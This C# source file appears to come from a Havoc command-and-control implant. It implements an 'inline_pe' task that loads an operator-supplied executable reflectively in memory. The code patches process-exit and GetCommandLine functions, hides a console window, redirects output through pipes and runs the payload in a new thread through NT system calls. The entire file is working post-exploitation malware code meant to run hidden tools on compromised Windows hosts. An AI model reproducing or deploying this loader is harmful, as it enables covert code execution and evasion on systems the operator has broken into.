using HavocImplant.NativeUtils;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using static HavocImplant.NativeUtils.Delegates;
using static HavocImplant.NativeUtils.Structs;
using static HavocImplant.NativeUtils.Structs.Win32;
using static HavocImplant.NativeUtils.Wrappers;

namespace HavocImplant.AgentFunctions
{

    //Thanks apollo and nettitude
    public class InlinePE : CommandInterface
    {
        public override string Command => "inline_pe";
        public override bool Dangerous => true;

        public byte[] rawbytes;
        public int size;


        // General PE stuff
        public IMAGE_DOS_HEADER dosHeader;
        public IMAGE_FILE_HEADER fileHeader;
        public IMAGE_OPTIONAL_HEADER64 optionalHeader;
        public IMAGE_SECTION_HEADER[] imageSectionHeaders;
        public IntPtr peBase = IntPtr.Zero;
        public List<String> originalModules = new List<String>();

        // To prevent thread exiting from killing the process
        byte[] terminateProcessOriginalBytes;
        byte[] corExitProcessOriginalBytes;
        byte[] rtlExitUserProcessOriginalBytes;

        // For arg fixing
        public string fileName;
        public string args;
        byte[] originalCommandLineFuncBytes;
        string commandLineFunc;

        //Additional artifacts to clear at the end
        public Dictionary<IntPtr, uint> sectionAddresses = new Dictionary<IntPtr, uint>();

        // File Descriptor Shit
        public struct FileDescriptorPair 
        {
            public IntPtr Read;
            public IntPtr Write;
        }
        private const uint BYTES_TO_READ = 1024;

        private IntPtr _oldGetStdHandleOut;
        private IntPtr _oldGetStdHandleError;

        private FileDescriptorPair _kpStdOutPipes;
        private Task<string> _readTask;

        private IntPtr hWin;

        public InlinePE() // For initial loading
        {
        }
        public override async Task Run(int taskId)
        {

            rawbytes = Convert.FromBase64String(Agent.taskingInformation[taskId].taskFile);
            args = Agent.taskingInformation[taskId].taskArguments;
            fileName = "bruh";

            //The Class will instantiate itself just so instance vars get cleared on each run
            Output = new InlinePE(rawbytes, args, fileName).Output; 
            ReturnOutput(taskId);
        }
        /// <summary>
        /// Reads and parses properties of the PE from disc. Temporarily writes into memory.
        /// </summary>
        /// <param name="ntdll"></param> An ntdll instance for indirect syscalls
        /// <param name="pe"></param> PE byte array
        public InlinePE(byte[] rawbytes, string args, string fileName)
        {
            this.rawbytes = rawbytes;
            this.args = args;
            this.fileName = fileName;
            IntPtr tmpPtrDosHeader = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)rawbytes.Length;
            NtAllocateVirtualMemory((IntPtr)(-1), ref tmpPtrDosHeader, IntPtr.Zero, ref regionSize, (uint)(Enums.AllocationType.Commit | Enums.AllocationType.Reserve), (uint)Enums.MemoryProtection.ReadWrite);

            var unmanagedBytes = GCHandle.Alloc(rawbytes, GCHandleType.Pinned);
            NtWriteVirtualMemory((IntPtr)(-1), tmpPtrDosHeader, unmanagedBytes.AddrOfPinnedObject(), (uint)rawbytes.Length, out uint unused);
            unmanagedBytes.Free();

            dosHeader = (Structs.Win32.IMAGE_DOS_HEADER)Marshal.PtrToStructure(tmpPtrDosHeader, typeof(Structs.Win32.IMAGE_DOS_HEADER));

            IntPtr tmpPtrFileHeader = IntPtr.Add(tmpPtrDosHeader, (int)dosHeader.e_lfanew+4); //FileHeader is 4 bytes into the NT header
            fileHeader = (Structs.Win32.IMAGE_FILE_HEADER)Marshal.PtrToStructure(tmpPtrFileHeader, typeof(Structs.Win32.IMAGE_FILE_HEADER));

            IntPtr tmpPtrOptionalHeader = IntPtr.Add(tmpPtrFileHeader, 20);
            optionalHeader = (Structs.Win32.IMAGE_OPTIONAL_HEADER64)Marshal.PtrToStructure(tmpPtrOptionalHeader, typeof(Structs.Win32.IMAGE_OPTIONAL_HEADER64));

            imageSectionHeaders = new Structs.Win32.IMAGE_SECTION_HEADER[fileHeader.NumberOfSections];
            for (int i = 0; i < imageSectionHeaders.Length; i++)
            {
                IntPtr tmpPtrImageSectionHeader = IntPtr.Zero;
                if (i == 0) tmpPtrImageSectionHeader = IntPtr.Add(tmpPtrOptionalHeader, Marshal.SizeOf(optionalHeader));
                else tmpPtrImageSectionHeader = IntPtr.Add(tmpPtrOptionalHeader, Marshal.SizeOf(optionalHeader) + Marshal.SizeOf(imageSectionHeaders[i-1])*i);
                imageSectionHeaders[i] = (Structs.Win32.IMAGE_SECTION_HEADER)Marshal.PtrToStructure(tmpPtrImageSectionHeader, typeof(Structs.Win32.IMAGE_SECTION_HEADER));
            }
            IntPtr freeSize = (IntPtr)Marshal.SizeOf(dosHeader);
            NtFreeVirtualMemory((IntPtr)(-1), ref tmpPtrDosHeader, ref freeSize, (uint)0x8000);
            Map();
            ImportResolver();
            PatchExit();
            UpdateArgs();
            BeginRedirect();
            BeginRead();
            RunPE();
            ReturnPatches();
            EndRedirect();
            ReadOutput();
            //kernelbase.dynamicExecute<Delegates.FreeConsole>("FreeConsole", new object[] { });
        }
        public void Map()
        {
            IntPtr SizeOfImage = (IntPtr)optionalHeader.SizeOfImage;
            NtAllocateVirtualMemory((IntPtr)(-1), ref peBase, IntPtr.Zero, ref SizeOfImage, (uint)Enums.AllocationType.Commit, (uint)Enums.MemoryProtection.ReadWrite);

            // Copy Sections
            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
                IntPtr sectionSize = (IntPtr)imageSectionHeaders[i].SizeOfRawData;
                NtAllocateVirtualMemory((IntPtr)(-1), ref sectionLocation, IntPtr.Zero, ref sectionSize, (uint)Enums.AllocationType.Commit, (uint)Enums.PAGE_READWRITE);

                var unmanagedBytes = GCHandle.Alloc(rawbytes.ToList().GetRange((int)imageSectionHeaders[i].PointerToRawData, (int)imageSectionHeaders[i].SizeOfRawData).ToArray(), GCHandleType.Pinned);
                NtWriteVirtualMemory((IntPtr)(-1), sectionLocation, unmanagedBytes.AddrOfPinnedObject(), imageSectionHeaders[i].SizeOfRawData, out uint nothing);
                unmanagedBytes.Free();

            }



            // Base Relocations
            long delta = (long)peBase - (long)optionalHeader.ImageBase;
            IntPtr pRelocationTable = IntPtr.Add(peBase, (int)optionalHeader.BaseRelocationTable.VirtualAddress);
            Structs.Win32.IMAGE_BASE_RELOCATION relocationEntry = (Structs.Win32.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTable, typeof(Structs.Win32.IMAGE_BASE_RELOCATION));

            // Starting values
            int imageSizeOfBaseRelocation = Marshal.SizeOf(typeof(Structs.Win32.IMAGE_BASE_RELOCATION));
            IntPtr nextEntry = pRelocationTable;
            int sizeOfNextBlock = (int)relocationEntry.SizeOfBlock;
            IntPtr offset = pRelocationTable;
            while (true)
            {

                IntPtr pRelocationTableNextBlock = IntPtr.Add(pRelocationTable, sizeOfNextBlock);
                Structs.Win32.IMAGE_BASE_RELOCATION nextRelocationEntry = (Structs.Win32.IMAGE_BASE_RELOCATION)Marshal.PtrToStructure(pRelocationTableNextBlock, typeof(Structs.Win32.IMAGE_BASE_RELOCATION));
                IntPtr pRelocationEntry = IntPtr.Add(peBase, (int)relocationEntry.VirtualAdress);

                for (int i = 0; i < (int)((relocationEntry.SizeOfBlock - imageSizeOfBaseRelocation) / 2); i++) // TODO figure out magic numbers
                {
                    UInt16 value = (ushort)Marshal.ReadInt16(offset, 8 + 2 * i); // TODO figure out magic numbers
                    UInt16 type = (ushort)(value >> 12); // TODO figure out magic numbers
                    UInt16 fixup = (ushort)(value & 0xfff); // TODO figure out magic numbers

                    switch (type)
                    {
                        case 0x0:
                            break;
                        case 0xA:
                            var patchAddress = (IntPtr)(pRelocationEntry.ToInt64() + fixup);
                            var originalAddr = Marshal.ReadInt64(patchAddress);
                            Marshal.WriteInt64(patchAddress, originalAddr + delta);
                            break;
                    }
                }
                offset = (IntPtr)(pRelocationTable.ToInt64() + sizeOfNextBlock);
                sizeOfNextBlock += (int)nextRelocationEntry.SizeOfBlock;
                relocationEntry = nextRelocationEntry;
                nextEntry = (IntPtr)(nextEntry.ToInt64() + sizeOfNextBlock);

                if (nextRelocationEntry.SizeOfBlock == 0) break;
            }

            return;
        }
        public void ImportResolver()
        {
            int IDT_SINGLE_ENTRY_LENGTH = 20; // Each Import Directory Table entry is 20 bytes long https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#import-directory-table
            int IDT_IAT_OFFSET = 16; // Offset in IDT to Relative Virtual Address to the Import Address Table for this DLL
            int IDT_DLL_NAME_OFFSET = 12; // Offset in IDT to DLL name for this DLL
            int ILT_HINT_LENGTH = 2; // Length of the 'hint' prefix to the function name in the ILT/IAT

            var currentProcess = Process.GetCurrentProcess();
            foreach (ProcessModule module in currentProcess.Modules)
            {
                originalModules.Add(module.ModuleName);
            }

            // Resolve Imports
            IntPtr pIDT = IntPtr.Add(peBase, (int)optionalHeader.ImportTable.VirtualAddress);
            int dllIterator = 0;
            while (true)
            {
                IntPtr pDllImportTableEntry = IntPtr.Add(pIDT, IDT_SINGLE_ENTRY_LENGTH * dllIterator);

                int iatRVA = Marshal.ReadInt32(pDllImportTableEntry, IDT_IAT_OFFSET);
                IntPtr pIAT = IntPtr.Add(peBase, iatRVA);

                int dllNameRVA = Marshal.ReadInt32(IntPtr.Add(pDllImportTableEntry, IDT_DLL_NAME_OFFSET));
                IntPtr pDllname = IntPtr.Add(peBase, dllNameRVA);
                string dllName = Marshal.PtrToStringAnsi(pDllname);

                if (string.IsNullOrEmpty(dllName)) break;

                IntPtr moduleHandle = IntPtr.Zero;
                object[] argsLdrLoadDLL = new object[] { dllName };
                moduleHandle = (IntPtr)Utils.dynamicAPIInvoke<Delegates.LoadLibraryA>("kernel32.dll", "LoadLibraryA", argsLdrLoadDLL);        

                IntPtr pCurrentIATEntry = pIAT;
                while (true) // For each DLL iterate over its functions in the IAT and patch the IAT with the real address https://tech-zealots.com/malware-analysis/journey-towards-import-address-table-of-an-executable-file/
                {
                    IntPtr pDllFuncName = IntPtr.Add(peBase, Marshal.ReadInt32(pCurrentIATEntry) + ILT_HINT_LENGTH);
                    string dllFuncName = Marshal.PtrToStringAnsi(pDllFuncName);
                    if (string.IsNullOrEmpty(dllFuncName)) break;

                    IntPtr pRealFunction = Utils.getFuncLocation(moduleHandle, dllFuncName);
                    if (pRealFunction == IntPtr.Zero) break;
                    else Marshal.WriteInt64(pCurrentIATEntry, pRealFunction.ToInt64());

                    //Console.WriteLine("Function {0}", dllFuncName);
                    pCurrentIATEntry = IntPtr.Add(pCurrentIATEntry, IntPtr.Size); // Shift the current entry to point to the next entry along, as each entry is just a pointer this is one IntPtr.Size
                }
                dllIterator++;
            }
        }
        public void PatchExit()
        {
            IntPtr pExitThread = Utils.getFuncLocation("kernelbase", "ExitThread");
            /*
                mov rcx, 0x0 #takes first arg
                mov rax, <ExitThread> # 
                push rax
                ret
            */
            List<byte> exitThreadPatchBytes = new List<byte>() { 0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, 0x48, 0xB8 };
            byte[] pExitThreadAsByes = BitConverter.GetBytes((long)pExitThread);
            exitThreadPatchBytes.AddRange(pExitThreadAsByes);
            exitThreadPatchBytes.Add(0x50);
            exitThreadPatchBytes.Add(0xC3);

            terminateProcessOriginalBytes = Utils.PatchFunction(ntdll, "kernelbase", "TerminateProcess", exitThreadPatchBytes.ToArray());
            corExitProcessOriginalBytes = Utils.PatchFunction(ntdll, "mscoree", "CorExitProcess", exitThreadPatchBytes.ToArray());
            rtlExitUserProcessOriginalBytes = Utils.PatchFunction(ntdll,"ntdll", "RtlExitUserProcess", exitThreadPatchBytes.ToArray());
            
        }
        public void UpdateArgs()
        {
            bool PatchGetCommandLineFunc(dll ntdll, string newCommandLineString)
            {
                IntPtr pCommandLineString = (IntPtr)Utils.dynamicAPIInvoke<Delegates.GetCommandLineA>("Kernel32", "GetCommandLineW", new object[] { });
                string commandLineString = Marshal.PtrToStringAuto(pCommandLineString);

                Encoding _encoding = Encoding.UTF8;

                if (commandLineString != null)
                {
                    var stringBytes = new byte[commandLineString.Length];

                    // Copy the command line string bytes into an array and check if it contains null bytes (so if it is wide or not
                    Marshal.Copy(pCommandLineString, stringBytes, 0, commandLineString.Length); // Even if ASCII won't include null terminating byte

                    if (!new List<byte>(stringBytes).Contains(0x00)) _encoding = Encoding.ASCII; // At present assuming either ASCII or UTF8

                }

                // Set the GetCommandLine func based on the determined encoding
                commandLineFunc = _encoding.Equals(Encoding.ASCII) ? "GetCommandLineA" : "GetCommandLineW"; // We're always reading GetCommandLineW so idk why this matters
                // Write the new command line string into memory
                IntPtr pNewString = _encoding.Equals(Encoding.ASCII)
                    ? Marshal.StringToHGlobalAnsi(newCommandLineString)
                    : Marshal.StringToHGlobalUni(newCommandLineString);

                // Create the patch bytes that provide the new string pointer
                var patchBytes = new List<byte>() { 0x48, 0xB8 }; // TODO architecture
                var pointerBytes = BitConverter.GetBytes(pNewString.ToInt64());

                patchBytes.AddRange(pointerBytes);

                patchBytes.Add(0xC3);

                // Patch the GetCommandLine function to return the new string
                originalCommandLineFuncBytes = Utils.PatchFunction(ntdll, "kernelbase", commandLineFunc, patchBytes.ToArray());
                if (originalCommandLineFuncBytes == null) return false;
                return true;
            }

            string newCLIStr = $"\"{fileName}\" {args}";
 
            // Patching GetCommandLine and running the PE
            PatchGetCommandLineFunc(ntdll, newCLIStr);
            
        }
        public void BeginRedirect()
        {
            
            AllocConsole();
            hWin = GetConsoleWindow();
            HideWindow(hWin);
            
            _oldGetStdHandleOut = GetStdHandle(Enums.STD_OUTPUT_HANDLE);
            _oldGetStdHandleError = GetStdHandle(Enums.STD_ERROR_HANDLE);
            
            //Creating STDOut/IN/ERR Pipes to redirect to
            SECURITY_ATTRIBUTES outSA = default;
            outSA.nLength = Marshal.SizeOf(outSA);
            outSA.bInheritHandle = 1;
            CreatePipe(out var read, out var write, ref outSA, 0);
            _kpStdOutPipes = new FileDescriptorPair() { Read = read, Write = write};

            //Setting the new pipes
            SetStdHandle(Enums.STD_OUTPUT_HANDLE, _kpStdOutPipes.Write);
            SetStdHandle(Enums.STD_ERROR_HANDLE, _kpStdOutPipes.Write);

        }
        public void RunPE()
        {
            // Adjusting memory protections before takeoff
            Console.WriteLine($"There are {fileHeader.NumberOfSections} sections");
            for (int i = 0; i < fileHeader.NumberOfSections; i++)
            {
                IntPtr sectionLocation = IntPtr.Add(peBase, (int)imageSectionHeaders[i].VirtualAddress);
                
                uint memProtectionConstant = 0;
                Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS sectionProtect = (Structs.Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS)imageSectionHeaders[i].Characteristics;

                if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_READWRITE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_READ;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_READWRITE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE) && sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE_WRITECOPY;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_WRITE))
                    memProtectionConstant = Win32.Enums.PAGE_WRITECOPY;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_EXECUTE))
                    memProtectionConstant = Win32.Enums.PAGE_EXECUTE;
                else if (sectionProtect.HasFlag(Win32.Enums.IMAGE_SECTION_HEADER_CHARACTERISTICS.IMAGE_SCN_MEM_READ))
                    memProtectionConstant = Win32.Enums.PAGE_READONLY;

                Console.WriteLine($"Protecting {new string(imageSectionHeaders[i].Name)}");
                IntPtr sectionSize = (IntPtr)imageSectionHeaders[i].SizeOfRawData;
                NtProtectVirtualMemory((IntPtr)(-1), ref sectionLocation, ref sectionSize, memProtectionConstant, out uint unused2);
            }
            
            IntPtr threadStartAddress = IntPtr.Add(peBase, (int)optionalHeader.AddressOfEntryPoint);
            IntPtr threadHandle = IntPtr.Zero;

            NtCreateThreadEx(ref threadHandle, (uint)Enums.ACCESS_MASK.GENERIC_ALL, IntPtr.Zero, Process.GetCurrentProcess().Handle, threadStartAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);

            LargeInteger li = new LargeInteger();
            long second = -10000000L;
            li.QuadPart = 5*second;

            IntPtr pLargeInt = IntPtr.Zero;
            IntPtr liSize = (IntPtr)Marshal.SizeOf(pLargeInt);
            NtAllocateVirtualMemory((IntPtr)(-1), ref pLargeInt, IntPtr.Zero, ref liSize, (uint)(Enums.AllocationType.Commit | Enums.AllocationType.Reserve), (uint)Enums.MemoryProtection.ReadWrite);

            GCHandle unmanagedLargeInt = GCHandle.Alloc(li, GCHandleType.Pinned);
            NtWriteVirtualMemory((IntPtr)(-1), pLargeInt, unmanagedLargeInt.AddrOfPinnedObject(), (uint)Marshal.SizeOf(li), out uint unused);
            unmanagedLargeInt.Free();

            NtWaitForSingleObject(threadHandle, false, pLargeInt);

            liSize = (IntPtr)Marshal.SizeOf(pLargeInt);
            NtFreeVirtualMemory((IntPtr)(-1), ref pLargeInt, ref liSize, (uint)0x8000);
            
            foreach (var section in sectionAddresses)
            {
                IntPtr loc = section.Key;
                IntPtr size = (IntPtr)section.Value;
                NtFreeVirtualMemory((IntPtr)(-1), ref loc, ref size, (uint)0x8000);
            }
        }
        public void ReturnPatches()
        {
            Utils.PatchFunction(ntdll, "kernelbase", commandLineFunc, originalCommandLineFuncBytes.ToArray());
            Utils.PatchFunction(ntdll, "kernelbase", "TerminateProcess", terminateProcessOriginalBytes.ToArray());
            Utils.PatchFunction(ntdll, "mscoree", "CorExitProcess", corExitProcessOriginalBytes.ToArray());
            Utils.PatchFunction(ntdll, "ntdll", "RtlExitUserProcess", rtlExitUserProcessOriginalBytes.ToArray());
        }
        public void BeginRead()
        {
            _readTask = Task.Factory.StartNew(() =>
            {
                string output = "";

                var buffer = new byte[BYTES_TO_READ];
                byte[] outBuffer;

                while (true)
                {
                    bool ok = ReadFile(_kpStdOutPipes.Read, buffer, BYTES_TO_READ, out uint bytesRead, IntPtr.Zero);
                    if (!ok) break;
                    if (bytesRead != 0)
                    {
                        outBuffer = new byte[bytesRead];
                        Array.Copy(buffer, outBuffer, bytesRead);
                        output += Encoding.Default.GetString(outBuffer);
                    }
                }
                return output;
            });
        }
        public void EndRedirect()
        {
            
            SetStdHandle(Enums.STD_OUTPUT_HANDLE, _oldGetStdHandleOut);
            SetStdHandle(Enums.STD_ERROR_HANDLE, _oldGetStdHandleError);
            try
            {
                // Need to close write before read else it hangs as could still be writing
                if (_kpStdOutPipes.Write != IntPtr.Zero)
                {
                    CloseHandle(_kpStdOutPipes.Write);
                }

                if (_kpStdOutPipes.Read != IntPtr.Zero)
                {
                    CloseHandle(_kpStdOutPipes.Read);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] Error closing handles: {e}");
            }
        }
        public void ReadOutput()
        {
            while (!_readTask.IsCompleted)
            {
                Thread.Sleep(2000);
            }
            Output =  _readTask.Result;
        }

    }
}
